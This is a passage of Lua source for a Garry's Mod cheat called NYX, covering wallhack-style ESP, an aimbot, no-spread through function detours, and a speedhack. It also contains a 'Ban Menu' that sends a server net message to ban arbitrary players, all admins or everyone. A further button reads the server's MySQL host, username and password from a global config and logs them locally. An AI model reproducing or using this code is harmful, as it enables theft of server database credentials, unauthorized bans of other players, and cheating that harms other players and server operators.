				diff = y2 - y1 
			else 
				diff = y1 - y2 
			end
			
			if v:Health() > 100 then
				health = 100
			elseif v:Health() <= 0 then
				health = 0
			else
				health = v:Health()
			end
			
			local hpbarheight = ( v:Health() * diff ) / 100		
			
					surface.SetDrawColor( Color(5,5,5) )
					
						-- Left - Gauche
						surface.DrawLine( x1-8, y2+2, x1-8,y1-2 )
						--surface.DrawLine( x1-10, y2+2, x1-10,y1-2 )
				
						-- Bottom - Bas
						surface.DrawLine( x1-8, y2+1, x1-5,y2+1 )
						--surface.DrawLine( x1-10, y2+2, x1-3,y2+2 )
						
						-- Top - Haut
						surface.DrawLine( x1-8, y1-1, x1-5,y1-1 )
						--surface.DrawLine( x1-10, y1-2, x1-3,y1-2 )
						
						-- Right - Droite
						surface.DrawLine( x1-5, y2+2, x1-5,y1-2 )
						--surface.DrawLine( x1-4, y2+2, x1-4,y1-2 )
						
						
					surface.SetDrawColor( hCol )
						--surface.DrawLine( x1-8, y2, x1-8,y2-hpbarheight )
						surface.DrawLine( x1-7, y2, x1-7,y2-hpbarheight )
						surface.DrawLine( x1-6, y2, x1-6,y2-hpbarheight )
						--surface.DrawLine( x1-5, y2, x1-5,y2-hpbarheight )
		end
		
	-- 2D Boxes --
		if (ESP_Box_2D == true && InFov(v)) then		

				/*
					x1	y1	x2	
					
					
					
					
					
					x1	y2	x2
				*/
				

				surface.SetDrawColor( Color(5,5,5) )
					-- Top
					surface.DrawLine(x1-1,y1-1,x2+1,y1-1) -- Top
					surface.DrawLine(x1-1,y2+1,x2+1,y2+1) -- Bottom
					
					-- Bottom
					surface.DrawLine(x1-1,y1+1,x2+1,y1+1) -- Top
					surface.DrawLine(x1-1,y2-1,x2+1,y2-1) -- Bottom
					
					-- Left
					surface.DrawLine(x1+1,y1-1,x1+1,y2+1) -- Left
					surface.DrawLine(x2-1,y1-1,x2-1,y2+1) -- Right
					
					-- Right
					surface.DrawLine(x1-1,y1-1,x1-1,y2+1) -- Left
					surface.DrawLine(x2+1,y1-1,x2+1,y2+1) -- Right
					
					
				surface.SetDrawColor(col)
					surface.DrawLine(x1,y1,x1,y2) -- Left
					surface.DrawLine(x2,y1,x2,y2) -- Right
					surface.DrawLine(x1,y1,x2,y1) -- Top
					surface.DrawLine(x1,y2,x2,y2) -- Bottom
					
					--surface.DrawLine(x1,y2,x1,y1)
					--surface.DrawLine(x2,y1,x1,y1)
					--surface.DrawLine(x1,y1,x1,y2)
					--surface.DrawLine(x1,y1,x2,y1)
					--surface.DrawLine(x2,y1,x2,y2)
					--surface.DrawLine(x1,y2,x2,y2)
					--surface.DrawLine(x2,y2,x2,y1)
					--surface.DrawLine(x2,y2,x1,y2)
					
				--surface.SetDrawColor( col )
					--surface.DrawLine( x1-5, y1, x1-5,y2 )
					--surface.DrawLine(x1,y1,x1-5,y1)
					--surface.DrawLine(x1,y2,x1-5,y2)

		end	
		
	-- 3D Boxes --
		if (ESP_Box_3D == true) then
			local c, d 	= v:GetCollisionBounds()
				if (c && d) then
					local v1 = v:LocalToWorld(c) -- Vectors and shit. Look at the 2D.
					local v2 = v:LocalToWorld(Vector(c.x, c.y, d.z))
					local v3 = v:LocalToWorld(Vector(c.x, c.y + (d.y * 2), c.z))
					local v4 = v:LocalToWorld(Vector(c.x + (d.x * 2), c.y, c.z))
					local v5 = v:LocalToWorld(d)
					local v6 = v:LocalToWorld(Vector(d.x, d.y, c.z))
					local v7 = v:LocalToWorld(Vector(d.x, d.y + (c.y * 2), d.z))
					local v8 = v:LocalToWorld(Vector(d.x + (c.x * 2), d.y, d.z))
						
					v1 = v1:ToScreen() -- ToScreening it.
					v2 = v2:ToScreen()
					v3 = v3:ToScreen()
					v4 = v4:ToScreen()
					v5 = v5:ToScreen()
					v6 = v6:ToScreen()
					v7 = v7:ToScreen()
					v8 = v8:ToScreen()
						
					local function connect(box1, box2) -- Creating a function for dem yoloz.
						surface.DrawLine(box1.x, box1.y, box2.x, box2.y)
					end

					surface.SetDrawColor(col) -- Don't forget dem color.
						connect(v1, v2) -- Connect the lines. See the function.
						connect(v3, v8)
						connect(v4, v7)
						connect(v6, v5)
						connect(v4, v6)
						connect(v4, v1)
						connect(v1, v3)
						connect(v3, v6)
						connect(v5, v8)
						connect(v8, v2)
						connect(v2, v7)
						connect(v7, v5)
				end
		end
		
		
		
	-- RADAR --	
		if (ESP_Radar == true) then
					
			--local ps = {}
			
			local origin = LocalPlayer():GetPos()
			local yaw = -1 * LocalPlayer():EyeAngles().y - 90
						
				local lbound = origin.x - radius
				local tbound = origin.y - radius
				
				local x = ratio * (v:GetPos().x - lbound) - rradius
				local y = ratio * (v:GetPos().y - tbound) - rradius
				local rx = -1 * (x * math.cos(math.rad(yaw)) - y * math.sin(math.rad(yaw)))
				local ry = x * math.sin(math.rad(yaw)) + y * math.cos(math.rad(yaw))
				
				local dx = rx
				local dy = ry
				
				if (ESP_Radar_Crosshair == true) then
					if (math.abs(dx) + 1 && math.abs(dy) + 1) then
					--	DrawArrow(dx + orgx + rradius, dy + orgy + rradius, v:EyeAngles().y - LocalPlayer():EyeAngles().y)
						NYX:drawBlip(dx + orgx + rradius, dy + orgy + rradius, col)
					end
				else
					if (math.abs(dx) + 1 <= rradius && math.abs(dy) + 1 <= rradius) then
					--	DrawArrow(dx + orgx + rradius, dy + orgy + rradius, v:EyeAngles().y - LocalPlayer():EyeAngles().y)
						NYX:drawBlip(dx + orgx + rradius, dy + orgy + rradius, col)
					end
				end
		
		end
		
	end
-- ======================================================================================================================================================================================================== --





/*******************************************
OUTSIDE CONDITION
*******************************************/
-- ======================================================================================================================================================================================================== --
	-- WITNESS --
		if (ESP_Witness == true) then
			local Time = os.time() - 1
			local Witnesses = 0
			local BeingWitnessed = true

			if Time < os.time() then
				Time = os.time() + .5
				Witnesses = 0
				BeingWitnessed = false
				for k, pla in pairs(player.GetAll()) do
					if pla:IsValid() and pla != LocalPlayer() then
						Trace.start  = LocalPlayer():EyePos() + Offset
						Trace.endpos = pla:EyePos() + Offset
						Trace.filter = {pla, LocalPlayer()}
						TraceRes = util.TraceLine(Trace)
						if !TraceRes.Hit then
							if (pla:EyeAngles():Forward():Dot((LocalPlayer():EyePos() - pla:EyePos())) > Cap) then
								Witnesses = Witnesses + 1
								BeingWitnessed = true
							end
						end
					end
				end
			end

			if BeingWitnessed then
				IsWitness = Color(255, 000, 000, 255)
			else
				IsWitness = Color(000, 255, 000, 255)
			end
			
				draw["SimpleTextOutlined"]( "Witnesses: "..tostring(Witnesses), fonty, ScrW()/2, 7.5, IsWitness, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
		end

	-- MURDERER ESP --
		if (ESP_Murder == true) then
			for _, wep in pairs( v:GetWeapons() ) do
				local MurdererName = 'None'
				local BystanderName = 'None'
					local pos = ( wep:GetPos() + Vector( 0,0,20 ) ):ToScreen()
					if wep:GetClass() == "weapon_mu_knife" then
						local Murderer = wep.Owner
						local MurdererName = wep.Owner:Name()
						local GMName = wep.Owner:GetBystanderName()
						local col = wep.Owner:GetPlayerColor()
						col = Color(col.x * 255, col.y * 255, col.z * 255)
					-- MURDERER CAMERA --
						if (ESP_Murder_Cam == true) then
								surface.SetDrawColor( 40, 40, 40, 200)
										surface.DrawRect(MurderCam.x-5 , MurderCam.y-5, MurderCam.w+10, MurderCam.h+30 )
										MurderCam.angles = Angle(Murderer:EyeAngles().pitch,Murderer:EyeAngles().yaw,Murderer:EyeAngles().roll) ---Murderer:EyeAngles().pitch
										MurderCam.origin = NYX:GetAimPos(Murderer) --Murderer:GetPos()+Vector(0,0,60)
										render.RenderView( MurderCam )
										draw.SimpleTextOutlined("Murderer Camera ("..GMName.." '"..MurdererName.."')","Default",(MurderCam.x)+(MurderCam.w/2), (MurderCam.y)+(MurderCam.h+12.5),col,TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,0.1,Color(0,0,0,255))
						end
							if(not table.HasValue(NYX['murderer'], Murderer)) then
								table.Empty(NYX['murderer']);
								table.Empty(NYX['murderer']);
								table.insert(NYX['murderer'], Murderer);
								if (MISC_Murder_Spoil == true) then
									RunConsoleCommand("say", "["..NYX['HackName'].."] "..GMName.." ("..MurdererName..") is the Murderer !")
								end
								chat.AddText(col, "["..NYX['HackName'].."] "..GMName.." ("..MurdererName..") is the Murderer !")
								surface.PlaySound("buttons/blip1.wav");
							end
						draw["SimpleTextOutlined"]( "MURDERER ("..GMName..")", fonty, pos.x, pos.y, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
					elseif wep:GetClass() == "weapon_mu_magnum" then
						local col = wep.Owner:GetPlayerColor()
						col = Color(col.x * 255, col.y * 255, col.z * 255)
						draw["SimpleTextOutlined"]( "44. Magnum", fonty, pos.x, pos.y, wep.Owner:GetPlayerColor(), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
					end
			end
		end
-- ======================================================================================================================================================================================================== --





	end
end

/*********************************************
AIMBOT
*********************************************/

NYX['attachments'] =
{
	"eyes",
	"forward",
	"head",
};

NYX['bones'] =
{
	"ValveBiped.Bip01_Head1",
	"ValveBiped.Anim_Attachment_RH",
	"ValveBiped.Bip01_Spine",
	"ValveBiped.Bip01_R_Hand",
	"ValveBiped.Bip01_R_Forearm",
	"ValveBiped.Bip01_R_Foot",
	"ValveBiped.Bip01_R_Thigh",
	"ValveBiped.Bip01_R_Calf",
	"ValveBiped.Bip01_R_Shoulder",
	"ValveBiped.Bip01_R_Elbow",
};

function NYX:GetAimPos( e )
/*
	if (AIM_AimPos == "Attachments") then
		for k, v in pairs( NYX['attachments'] ) do
			if( e:LookupAttachment( v ) ) then
				local att = e:GetAttachment( e:LookupAttachment( v ) );
				if( att ) then
					return att['Pos'];
				end
			end
		end
	elseif (AIM_AimPos == "EyePos") then
		return e:EyePos()
	else
		return ( e:LocalToWorld( e:OBBCenter() ) )
	end
	
		for k, v in pairs( NYX['attachments'] ) do
			if( e:LookupAttachment( v ) ) then
				local att = e:GetAttachment( e:LookupAttachment( v ) );
				if( att ) then
					return att['Pos'];
				end
			end
		end
		


*/

		for k, v in pairs( NYX['attachments'] ) do
			if( e:LookupAttachment( v ) ) then
				local att = e:GetAttachment( e:LookupAttachment( v ) );
				if( att ) then
					return att['Pos'];
				end
			end
		end
		
	return ( e:LocalToWorld( e:OBBCenter() ) )
end

function NYX:IsVisible( v )
	local tracedata = 
	{ 
		start 	= LocalPlayer():GetShootPos(),
		endpos 	= NYX:GetAimPos( v ), 
		filter 	= { LocalPlayer(), v },
		mask 	= MASK_SHOT 
	};
						
	local trace = util['TraceLine']( tracedata );
	
	return ( trace['Fraction'] == 1 );
end

function NYX:ValidTarget( v )
	if( _nyx['IsDormant']( v:EntIndex() ) ) then
		return false;
	end
	if v:IsPlayer() then
	if( !v:Alive() ) then
		return false;
	end 
	
	if (v:InVehicle()) then
		return false;
	end
	
	if( v:Team() == LocalPlayer():Team() && (AIM_Ignore_Team == true) ) then
		return false;
	end
	
	LocalPlayer().DarkRPVars = LocalPlayer().DarkRPVars or {}
	v.DarkRPVars = v.DarkRPVars or {}
	local plyJob = LocalPlayer().DarkRPVars.job
	local targetJob = v.DarkRPVars.job

	if (AIM_COG_Ignore == true) then
		if string.find(plyJob,"ALPHA") && string.find(targetJob,"ALPHA") then
			return false;
		
		elseif string.find(plyJob,"BRAVO") && string.find(targetJob,"BRAVO") then
			return false;
		
		elseif string.find(plyJob,"CHARLIE") && string.find(targetJob,"CHARLIE") then
			return false;
		end
	end
	
	if( !table['HasValue'](NYX['murderer'],v) && !table['HasValue'](NYX['murderer'],LocalPlayer()) && (AIM_Only_Murderer == true) ) then
		return false;
	end
	
	if( team['GetColor'](v:Team()) == team['GetColor'](LocalPlayer():Team()) && (AIM_Ignore_Team_Color == true) ) then
		return false;
	end
	
	if ( NYX:IsAdmin( v ) && (AIM_Ignore_Admins == true) ) then
		return false;
	end
	
	if( v:Team() == TEAM_SPECTATOR ) then -- lel
		return false;
	end
	
	if( v == LocalPlayer() ) then -- This is obv.
		return false;
	end

	if( v:GetFriendStatus() == "friend" && (AIM_Ignore_SteamFriends == true) ) then -- Ignore Friends
		return false;
	end
		
	local col = v:GetColor()
	local col2 = LocalPlayer():GetColor()
	if( (AIM_Ignore_SpawnProtection == true) && col['a'] < 255 or col2['a'] < 255 ) then
		return false;
	end
	
	if ( v:GetMaterial() == "models/props_combine/stasisshield_sheet" && (AIM_Ignore_SpawnProtection == true) ) then
		return false;
	end
	
	if ( v:GetMaterial() == "models/props_combine/portalball001_sheet" && (AIM_Ignore_TKZBuildMode == true) ) then
		return false;
	end
	
end
	
	if( !NYX:IsVisible( v ) ) then
		return false;
	end
	
	return true;
end

function NYX:GetATarget()
	NYX['target'] 	= nil;
	NYX['distance'] = 9999999;
	
	if( !NYX['aiming'] ) then
		return;
	end
		
	/*
	for k, v in pairs( ents['FindByClass']("npc_*") ) do
		if( NYX:ValidTarget( v ) ) then
			local distance = math['deg']( math['acos']( LocalPlayer():GetAimVector():Dot( ( NYX:GetAimPos( v ) - LocalPlayer():GetShootPos() ):GetNormal() ) ) );
			if( distance < NYX['distance'] ) then
				return v;
			end
		end
	end
	*/
	for k, v in pairs( player['GetAll']() && ents['FindByClass']("npc_*") ) do
		if( NYX:ValidTarget( v ) ) then
			local distance = math['deg']( math['acos']( LocalPlayer():GetAimVector():Dot( ( NYX:GetAimPos( v ) - LocalPlayer():GetShootPos() ):GetNormal() ) ) );
			if( distance < NYX['distance'] ) then
				return v;
			end
		end
	end
end

function NYX:FindTarget()
	NYX['target'] 	= nil;
	NYX['distance'] = 9999999;
	
	if( !NYX['aiming'] ) then
		return;
	end
		
	for k, v in pairs( ents['FindByClass']("npc_*") ) do
		if( NYX:ValidTarget( v ) ) then
			local distance = math['deg']( math['acos']( LocalPlayer():GetAimVector():Dot( ( NYX:GetAimPos( v ) - LocalPlayer():GetShootPos() ):GetNormal() ) ) );
			if( distance < NYX['distance'] ) then
				NYX['target'] 	= v;
				NYX['distance'] = distance;
				
				local pred = ( ( v:GetVelocity() / 50 - LocalPlayer():GetVelocity() / 50 ) - Vector( 0, 0, AIM_Offset ) ); -- Alternate Prediction: --pred = ( v:GetVelocity() * v:GetPos():Distance( LocalPlayer():GetPos() ) / 3110 );
				
				local pos = NYX:GetAimPos( v )
				
				NYX['aimpos'] 	= ( ( pos + pred ) - LocalPlayer():EyePos() ):Angle();
					
				NYX['aimpos']['p'] = math['NormalizeAngle']( NYX['aimpos']['p'] );
				NYX['aimpos']['y'] = math['NormalizeAngle']( NYX['aimpos']['y'] );
				NYX['aimpos']['r'] = 0;
			end
		end
	end
	for k, v in pairs( player['GetAll']() ) do
		if( NYX:ValidTarget( v ) ) then
			local distance = math['deg']( math['acos']( LocalPlayer():GetAimVector():Dot( ( NYX:GetAimPos( v ) - LocalPlayer():GetShootPos() ):GetNormal() ) ) );
			if( distance < NYX['distance'] ) then
				NYX['target'] 	= v;
				NYX['distance'] = distance;
				
				local pred = ( ( v:GetVelocity() / 50 - LocalPlayer():GetVelocity() / 50 ) - Vector( 0, 0, AIM_Offset ) ); -- Alternate Prediction: --pred = ( v:GetVelocity() * v:GetPos():Distance( LocalPlayer():GetPos() ) / 3110 );
				
				local pos = NYX:GetAimPos( v )
				
				NYX['aimpos'] 	= ( ( pos + pred ) - LocalPlayer():EyePos() ):Angle();
					
				NYX['aimpos']['p'] = math['NormalizeAngle']( NYX['aimpos']['p'] );
				NYX['aimpos']['y'] = math['NormalizeAngle']( NYX['aimpos']['y'] );
				NYX['aimpos']['r'] = 0;
			end
		end
	end
end

/*********************************************
MISC
*********************************************/

function NYX:KeyEvent()
    for k, v in pairs( NYX['keys'] ) do
        if( v['mouse'] ) then
			if( input['IsMouseDown']( k ) ) then
				NYX[v['var']] = true;
			else
				NYX[v['var']] = false;
			end
		else
			if( input['IsKeyDown']( k ) ) then
				NYX[v['var']] = true;
			else
				NYX[v['var']] = false;
			end
		end
			
    end
end

function NYX.Think()
	NYX:FindTarget();
	NYX:KeyEvent();
end

/*********************************************
REMOVALS
*********************************************/

function NYX:Detour( old, new )
	NYX['detours'][new] = old;
	return new;
end

local _R = debug['getregistry'](); -- sdfsdfsdfsd

_R['Entity']['FireBullets'] = NYX:Detour( _R['Entity']['FireBullets'], function( ent, bullet )
	NYX['coners'][LocalPlayer():GetActiveWeapon():GetPrintName()] = bullet['Spread'];
	return NYX['detours'][_R['Entity']['FireBullets']]( ent, bullet );
end )

--_G['hook']['Call'] = NYX:Detour( _G['hook']['Call'], function( name, gm, ... )
--	MsgN( name );
--	return NYX['detours'][_G['hook']['Call']]( name, gm, ... );
--end )

--SWEP.IronSightsPos = Vector (2.4537, 1.0923, 0.2696)
--SWEP.IronSightsAng = Vector (0.0186, -0.0547, 0)

NYX['cones'] = 
{
	["#HL2_SMG1"] 			= Vector( -0.04362, -0.04362, -0.04362 ),
	["#HL2_Pistol"] 		= Vector( -0.0100, -0.0100, -0.0100 ),
	["#HL2_Pulse_Rifle"] 	= Vector( -0.02618, -0.02618, -0.02618 ),
	["#HL2_Shotgun"] 		= Vector( -0.08716, -0.08716, -0.08716 ),
};

function NYX:NoSpread( cmd, ang )
	wep 				= LocalPlayer():GetActiveWeapon();
	vecCone, valCone 	= Vector( 0, 0, 0 );
	
	if( wep:IsValid() ) then
		if( NYX['coners'][wep:GetPrintName()] ) then
			valCone = NYX['coners'][wep:GetPrintName()];
			if( tonumber( valCone ) ) then
				vecCone =  Vector( -valCone, -valCone, -valCone );
			elseif( type( valCone ) == "Vector" ) then
				vecCone = -1 * valCone;
			end
		/*
		if( wep.Base == "weapon_sh_base" ) then
				local Stance = LocalPlayer():IsOnGround() and LocalPlayer():Crouching() and 10 -- Crouching
				or !wep.Sprinting and LocalPlayer():IsOnGround() and 15 --Standing
				or wep.Walking and LocalPlayer():IsOnGround() and 20 --Walking
				or !LocalPlayer():IsOnGround() and 25  --Flying
				or wep.Primary.Ammo == "buckshot" and 0 --Shotguns not affected
				local WepType = ( wep.Sniper && 8 || wep.SMG && 2 || wep.Pistol && 2 || wep.Primary.Ammo == "buckshot" && 0 || 1.6 )
				local sh_mod_cone = wep.Primary.Cone * wep.Primary.Recoil * Stance * WepType
				local ang = angl:Forward() || ( ( G.LocalPlayer():GetAimVector() ):Angle() ):Forward();
				local conevec = Vector( -sh_mod_cone, -sh_mod_cone, -sh_mod_cone )
				return( _nyx['RemoveSpread']( cmd, ang, conevec ) ):Angle();
		end
		*/
		else
			if( NYX['cones'][wep:GetPrintName()] ) then 
				vecCone = NYX['cones'][wep:GetPrintName()]; 
			end
		end
	end
	
	return ( _nyx['RemoveSpread']( cmd, ang, vecCone ) ):Angle();
end

local function GetMeta2(name)
    return table.Copy(FindMetaTable(name) or {})
end

local PlyM = GetMeta2("Player")

/*********************************************
AIMBOT pt2
*********************************************/
local IsShooting = false
function NYX.CreateMove( cmd )
	if( NYX['aiming'] && NYX['target'] ) then
		
		--local text = "Current Target: ("..NYX['target']:Name()..")"
		--surface.SetFont("Default")
		--local size = surface.GetTextSize(text)
		--draw.RoundedBox(4,36,y-135,size+10,20,Color(0,0,0,100))
		--draw.DrawText(text,"Default",40,y-132,Color(255,255,255,200),TEXT_ALIGN_LEFT)
		
		local ang = NYX:NoSpread( cmd, NYX['aimpos'] )
		
		--ang['p'] = math['NormalizeAngle']( ang['p'] );
		--ang['y'] = math['NormalizeAngle']( ang['y'] );
		--ang['r'] = 0;
		
		_nyx['SetViewAngles']( cmd, ang );

	if (AIM_RapidFire == true) then 
		if !IsShooting then
			IsShooting = true
		else 
			IsShooting = false
		end
		if !IsShooting then
			cmd:SetButtons( bit['bor']( cmd:GetButtons(), IN_ATTACK ) );
		else
			
		end
		elseif !IsShooting then
			
		if !IsShooting then
			IsShooting = true
		else
			IsShooting = false
		end
	else
		cmd:SetButtons( bit['bor']( cmd:GetButtons(), IN_ATTACK ) );
	end
		if (AIM_AutoDuck == true) then cmd:SetButtons( bit['bor']( cmd:GetButtons(), IN_DUCK ) ) end
		if (AIM_AutoAim == true) then cmd:SetButtons( bit['bor']( cmd:GetButtons(), IN_ATTACK2 ) ) end
	
	elseif (!NYX['target']) then
		--local v = cmd:GetViewAngles() 
		--cmd:SetViewAngles(Angle(-181, v.y, 180))
	end
	
	if (MISC_BunnyHop == true) then _nyx['Bunnyhop']( cmd, LocalPlayer():IsOnGround(), LocalPlayer():GetMoveType() ); end -- Perfect BunnyHop
	
	_nyx['Speedhack']( NYX['speeding'] ); -- host_framerate Speedhack: Will require AllowCheats() (aka sv_cheats 1);
end

function NYX.CalcView( ply, origin, angles, fov )
--		local ply = LocalPlayer()

--		local wep = ply:GetActiveWeapon()
			--if wep.Primary then wep.Primary.Recoil = 0 end
			--if wep.Secondary then wep.Secondary.Recoil = 0 end
--		local view = GAMEMODE:CalcView( ply, origin, angles, zoomFOV ) || {}

--		return view
end

/*********************************************
HOOKING SHIT
*********************************************/
function NYX:AddHook( name, callback )
	local RandomString = tostring( math['random']( 0.666, 666 ) * math['random']( 0.666, 666 ) );
    hook['Add']( name, RandomString, callback );
end

NYX:AddHook( "DrawOverlay", NYX['Draw'] );
NYX:AddHook( "Think", NYX['Think'] );
NYX:AddHook( "CalcView", NYX['CalcView'] );
NYX:AddHook( "CreateMove", NYX['CreateMove'] );

/*********************************************
ENTITIES MENU
*********************************************/
function NYX.EntMenu()
	local menu = vgui.Create("DFrame")
		 menu:SetSize(500,350)
		 menu:MakePopup()
		 menu:SetTitle("Ban Menu (toplel)")
		 menu:Center()
		 menu:SetKeyBoardInputEnabled()
		 menu.Think = function()
			 if !NYX['entsmenu'] then
				 MenuOpen = false
				 menu:SetVisible( false )
		 	 end
	 	 end
		 
	/*
	local noton = vgui.Create("DListView",menu)
		noton:SetSize(200,menu:GetTall()-40)
		noton:SetPos(10,30)
		noton:AddColumn("Not Being Tracked")
		 	
	local on = vgui.Create("DListView",menu)
		 on:SetSize(200,menu:GetTall()-40)
		 on:SetPos(menu:GetWide()-210,30)
		 on:AddColumn("Being Tracked")

	local addent = vgui.Create("DButton",menu)
		 addent:SetSize(50,25)
		 addent:SetPos(menu:GetWide()/2-25,menu:GetTall()/2-20)
		 addent:SetText("+")
		 addent.DoClick = function()
				if noton:GetSelectedLine() != nil then
					local ent = noton:GetLine(noton:GetSelectedLine()):GetValue(1)
						if !table.HasValue(NYX['entities'], ent) then
							table.insert(NYX['entities'], ent)
							noton:RemoveLine(noton:GetSelectedLine())
							on:AddLine(ent)
						end
				end
		end

	local rement = vgui.Create("DButton",menu)
		 rement:SetSize(50,25)
		 rement:SetPos(menu:GetWide()/2-25,menu:GetTall()/2+20)
		 rement:SetText("-")
		 rement.DoClick = function()
				if on:GetSelectedLine() != nil then
					local ent = on:GetLine(on:GetSelectedLine()):GetValue(1)
					if table.HasValue(NYX['entities'],ent) then
						for k,v in pairs(NYX['entities']) do
							if v == ent then
								table.remove(NYX['entities'],k)
								end
							end
							on:RemoveLine(on:GetSelectedLine())
							noton:AddLine(ent)
						end
				end
		end

	local added = {}
		 for _,v in pairs(ents.GetAll()) do

		 if !table.HasValue(added,v:GetClass()) and !table.HasValue(NYX['entities'],v:GetClass()) and !string.find(v:GetClass(),"grav") and !string.find(v:GetClass(),"phys") and v:GetClass() != "player" then
		  noton:AddLine(v:GetClass())
		  table.insert(added,v:GetClass())
		 end

		 end

		for _,v in pairs(NYX['entities']) do
		 on:AddLine(v)
		end
		
	*/
		
	local basex, basey, behindy = 10, 30, 405

	local DermaList = vgui.Create("DListView",menu)
		DermaList:SetSize(480,menu:GetTall()-60)
		DermaList:SetPos(basex,basey)
		DermaList:AddColumn("Player List (Don't Click that Column.)")
		
    for k,v in pairs(player.GetAll()) do
		local banv = vgui.Create("DButton", DermaPanel)
		banv:SetText(" Ban "..v:Name().." ( "..v:SteamID().." )")
		banv.DoClick = function()
			net.Start("banleaver")
				net.WriteString(v:SteamID().."{sep}"..v:Name())
			net.SendToServer()
		end
		DermaList:AddLine( banv ) -- Add the item above
    end

	local BanAdmins = vgui.Create("DButton",menu)
		BanAdmins:SetSize(500/4,20)
		BanAdmins:SetPos(10,menu:GetTall()-25)
		BanAdmins:SetText("Ban Admins")
		BanAdmins.DoClick = function()
			for k, v in pairs ( player.GetAll() ) do
				if (NYX:IsAdmin( v ) && v != LocalPlayer()) then
					net.Start( "banleaver" )
						net.WriteString(v:SteamID().."{sep}"..v:Nick())
					net.SendToServer()
				end
			end
		end
		
	local BanEveryone = vgui.Create("DButton",menu)
		BanEveryone:SetSize(500/4-10,20)
		BanEveryone:SetPos(500/2,menu:GetTall()-25)
		BanEveryone:SetText("Ban Everyone")
		BanEveryone.DoClick = function()
			for k, v in pairs ( player.GetAll() ) do
				if (v:GetFriendStatus() != "friend" && v != LocalPlayer()) then
					net.Start( "banleaver" )
						net.WriteString(v:SteamID().."{sep}"..v:Nick())
					net.SendToServer()
				end
			end
		end
		
	local GetSQL = vgui.Create("DButton",menu)
		GetSQL:SetSize(500/4-10,20)
		GetSQL:SetPos(500/2+500/4,menu:GetTall()-25)
		GetSQL:SetText("Get the MySQL DB")
		GetSQL.DoClick = function()
			if !file.Exists(NYX['HackName'],"DATA") then
				file.CreateDir(NYX['HackName']);
			end
				if (_G.RP_MySQLConfig.EnableMySQL == true) then
					writeOnLog(1,GetHostName())
					writeOnLog(1,"==========================================================")
					writeOnLog(1,"DB Address: ".._G.RP_MySQLConfig.Host)
					writeOnLog(1,"Username: ".._G.RP_MySQLConfig.Username)
					writeOnLog(1,"Password: ".._G.RP_MySQLConfig.Password)
					writeOnLog(1,"DB Name: ".._G.RP_MySQLConfig.Database_name)
					writeOnLog(1,"DB Port: ".._G.RP_MySQLConfig.Database_port)
					writeOnLog(1,"==========================================================")
					writeOnLog(1," ")
				else
					chatNotify(Color(255,50,0), "MySQL is Disabled !")
					writeOnLog(0,GetHostName())
					writeOnLog(0,"==========================================================")
					writeOnLog(0,"-> MySQL is Disabled ! <-")
					writeOnLog(0,"DB Address: ".._G.RP_MySQLConfig.Host)
					writeOnLog(0,"Username: ".._G.RP_MySQLConfig.Username)
					writeOnLog(0,"Password: ".._G.RP_MySQLConfig.Password)
					writeOnLog(0,"DB Name: ".._G.RP_MySQLConfig.Database_name)
					writeOnLog(0,"DB Port: ".._G.RP_MySQLConfig.Database_port)
					writeOnLog(0,"-> MySQL is Disabled ! <-")
					writeOnLog(0,"==========================================================")
					writeOnLog(0," ")
				end
		end
		
	local checkbox = vgui.Create( "DCheckBoxLabel", menu )
		checkbox:SetPos(500/4+15,menu:GetTall()-22.5)
		checkbox:SetText( "Auto Admins Ban" )
		checkbox:SetConVar( "benervar" )
		checkbox:SetTextColor(Color(255,255,255))
		checkbox:SetTooltip( "Ban Admins on Connect" )
		checkbox:SizeToContents()	
end

function NYX.DoMenu()
	if ( NYX['entsmenu'] && !MenuOpen ) then
		MenuOpen = true
		NYX['EntMenu']()
	end
end
NYX:AddHook( "Think", NYX['DoMenu'] );

/*********************************************
MENU
*********************************************/
if nyx_menu then
        nyx_menu:Remove( );
        nyx_menu = nil;
end;
 
-- mouse in box function
function util.InBox( x, y, w, h )
    local mx, my = gui.MouseX( ), gui.MouseY( );
   
    if mx >= x and mx <= x + w and my >= y and my <= y + h then
        return true;
    end;
   
    return false;
end;
 
-- nyx hud script
local arrow_down = Material( "vgui/hack/arrow_down.png", nocull ); -- materials
local arrow_up = Material( "vgui/hack/arrow_up.png", nocull );
local grad = Material( "vgui/hack/gradient.png", nocull );
local nyx = Material( "vgui/hack/logo.png", nocull );
local off = Material( "vgui/hack/off.png", nocull );
local on = Material( "vgui/hack/on.png", nocull );
local seperator_bottom = Material( "vgui/hack/seperator_bottom.png", nocull );
local seperator_side = Material( "vgui/hack/seperator_side.png", nocull );
 
--HERP font
local tblFonts = { }
tblFonts["Derp"] = {
    font = "Tahoma",
    size = 18,
    weight = 0,
    shadow = true,
}
 
tblFonts["HerpSmall"] = {
    font = "Tahoma",
    size = 11,
    weight = 0,
    shadow = true,
}
 
for k,v in SortedPairs( tblFonts ) do
    surface.CreateFont( k, tblFonts[k] );
 
end
 
 
-- fake vars, change to yours
 
--[[
There has to be one table per tab
There has to be one var per table option
Add more tabs by looking at the very last 5 or so lines of the code
Remember to replace var table names when adding tabs
]]
 
local NUMBER_OF_TABS = 5; -- don't forget to change this
 
-- tab 1
local tab1_options = { };
tab1_options.num = 1;
tab1_options.toggle = false;
 
        tab1_options.name = "Aimbot"; -- edit name
       
        -- edit options
        tab1_options[ 1 ] = { };
        tab1_options[ 1 ].name = "Ignore Teammates";
        tab1_options[ 1 ].on = function( ) return AIM_Ignore_Team; end;
        tab1_options[ 1 ].off = function( ) AIM_Ignore_Team = false; end;
        tab1_options[ 1 ].seton = function( ) AIM_Ignore_Team = true; end;
		
        tab1_options[ 2 ] = { };
        tab1_options[ 2 ].name = "Ignore Spawn Protection";
        tab1_options[ 2 ].on = function( ) return AIM_Ignore_SpawnProtection; end;
        tab1_options[ 2 ].off = function( ) AIM_Ignore_SpawnProtection = false; end;
        tab1_options[ 2 ].seton = function( ) AIM_Ignore_SpawnProtection = true; end;
		
		tab1_options[ 3 ] = { };
        tab1_options[ 3 ].name = "Ignore Steam Friends";
        tab1_options[ 3 ].on = function( ) return AIM_Ignore_SteamFriends; end;
        tab1_options[ 3 ].off = function( ) AIM_Ignore_SteamFriends = false; end;
        tab1_options[ 3 ].seton = function( ) AIM_Ignore_SteamFriends = true; end;	   
	   
		tab1_options[ 4 ] = { };
        tab1_options[ 4 ].name = "Ignore Traitors";
        tab1_options[ 4 ].on = function( ) return AIM_Ignore_Traitors; end;
